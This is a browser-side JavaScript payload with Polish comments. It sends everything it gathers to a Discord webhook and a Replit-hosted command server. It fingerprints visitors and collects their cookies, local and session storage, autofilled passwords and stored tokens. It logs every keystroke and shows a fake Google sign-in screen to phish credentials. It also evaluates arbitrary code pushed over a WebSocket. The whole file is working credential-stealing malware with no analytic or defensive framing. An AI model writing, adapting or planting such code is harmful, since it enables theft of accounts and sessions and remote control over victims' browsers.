(async () => {
  const WEBHOOK = "https://discord.com/api/webhooks/1355611891434782800/dr5QNXmfpceY1eNmx4ug-1qqGM1MctBkN2kYUauetYNEsCLSBEu0eU0OqzAP6mjeVT3u";
  const C2_SOCKET = "https://83c7c3cd-a7f4-41b2-afa6-4b60e4451937-00-1n4lho27w035p.picard.replit.dev:3000/"; // Np. z Replit

  function send(msg) {
    fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: msg })
    });
  }

  // Fakescreen manual trigger
  window.fakescreen = () => {
    const overlay = document.createElement("div");
    overlay.id = "fakescreen";
    overlay.style = `
      position:fixed; inset:0; background:#fff;
      z-index:999999; display:flex; flex-direction:column;
      align-items:center; justify-content:center; font-family:sans-serif;
    `;
    overlay.innerHTML = `
      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" width="90" />
      <h2 style="margin:20px 0;">Sign in</h2>
      <input id="fs_user" placeholder="Email or phone" style="padding:10px; margin:5px; width:260px;" />
      <input id="fs_pass" type="password" placeholder="Enter your password" style="padding:10px; margin:5px; width:260px;" />
      <button onclick="submitFakeLogin()" style="padding:10px 20px; margin-top:10px;">Next</button>
      <p style="font-size:12px; color:gray; margin-top:10px;">Not your computer? Use Guest mode to sign in privately.</p>
    `;
    document.body.appendChild(overlay);
  };

  // Wysyłka danych z fałszywego loginu
  window.submitFakeLogin = () => {
    const u = document.getElementById("fs_user").value;
    const p = document.getElementById("fs_pass").value;
    send(`🎭 Fakescreen Login:\n📛 ${u}\n🔑 ${p}`);
    document.getElementById("fakescreen").remove();
  };

  try {
    const fp = await FingerprintJS.load().then(f => f.get());
    const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
    const cookies = document.cookie;
    const local = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
    const session = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)));

    let autofill = "";
    document.querySelectorAll("input").forEach(input => {
      if (input.value && (input.type === "email" || input.type === "password")) {
        autofill += `• ${input.type}: ${input.value}\n`;
      }
    });

    let tokens = [];
    for (let key in localStorage) {
      if (key.toLowerCase().includes("token")) {
        tokens.push(`🧬 ${key}: ${localStorage.getItem(key)}`);
      }
    }

    const msg = `**RECON :: checkerls-recon-ng**
🔎 FP: ${fp.visitorId}
🌍 IP: ${ip}
🧠 UA: ${navigator.userAgent}
📦 Cookies: ${cookies}
🧠 Autofill:\n${autofill}
📥 Local:\n${local}
📥 Session:\n${session}
🔐 Tokens:\n${tokens.join("\n") || "Brak"}
`;

    send(msg);

    // Keylogger
    document.addEventListener("keydown", e => {
      if (e.key.length === 1 || e.key === "Backspace") {
        send(`🔑 Keylog: ${e.key}`);
      }
    });

    // WebSocket C2
    const socket = new WebSocket(C2_SOCKET);
    socket.onmessage = e => {
      try {
        const out = eval(e.data);
        socket.send(`[✔️] ${out}`);
      } catch (err) {
        socket.send(`[❌] ${err.message}`);
      }
    };

  } catch (err) {
    console.error("Payload error:", err.message);
  }
})();
